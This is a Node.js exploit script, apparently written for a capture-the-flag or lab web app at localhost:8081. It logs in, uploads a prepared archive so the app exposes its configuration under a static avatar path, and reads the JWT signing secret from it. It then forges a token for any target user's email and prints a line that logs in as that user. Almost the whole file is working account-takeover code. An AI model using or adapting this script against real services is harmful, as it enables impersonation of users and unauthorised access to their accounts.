const axios = require('axios');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const argv = require('optimist')
    .usage('Usage: $0 --email [email for session create] --password [password] --target-email [target email]')
    .demand([ 'email', 'password', 'target-email' ])
    .argv;

const request = require('request');
const APP_URL = 'http://localhost:8081';

async function main(args) {
    const token = await createSession(args.email, args.password);
    await uploadArchive(token);
    const {id} = jwt.decode(token);
    const config = await fetchConfig(id);

    const user = await findUserByEmail(args['target-email']);
    const targetToken = createToken({ email: args['target-email'], id: user.id, secret: config.secret });
    
    console.log(`TO LOGIN: localStorage.setItem('token', '${targetToken}')`);
}

async function fetchConfig(id) {
    const url = `${APP_URL}/static/${id}/avatar`;

    const resp = await axios.get(url);
    return resp.data;
}

async function uploadArchive(token) {
    const url = `${APP_URL}/api/v1/files/upload?token=${token}`;

    return new Promise((res, rej) => {
        request.post({url, formData: {
            archive: fs.createReadStream(__dirname + '/archive.zip'),
        }}, (err, httpResponse, body) => {
            if (err) {
                return rej(err);
            }

            console.log("ARCHIVE HAS BEEN UPLOADED");
            res();
          });
    })


    const resp = await axios.get(url);
    return resp.data;
}


async function createSession(email, password) {
    const { data } = await axios.post(`${APP_URL}/api/v1/sessions`, {
        data : {
            email,
            password
        }
    });

    if (!data.status) throw 'Create session error.';

    return data.data.jwt;
}


function createToken({ id, email, secret }) {
    const data = {
        id: id,
        email: email,
        status: 'ACTIVE',
        firstName: '',
        secondName: ''
    };

    return jwt.sign(data, secret);
}

async function findUserByEmail(email) {
    const url = `${APP_URL}/api/v1/users`;
    const resp = await axios.get(url);
    return resp.data.data.find(user => user.email === email);
}

main(argv).catch(e => {
    console.error(e);
});
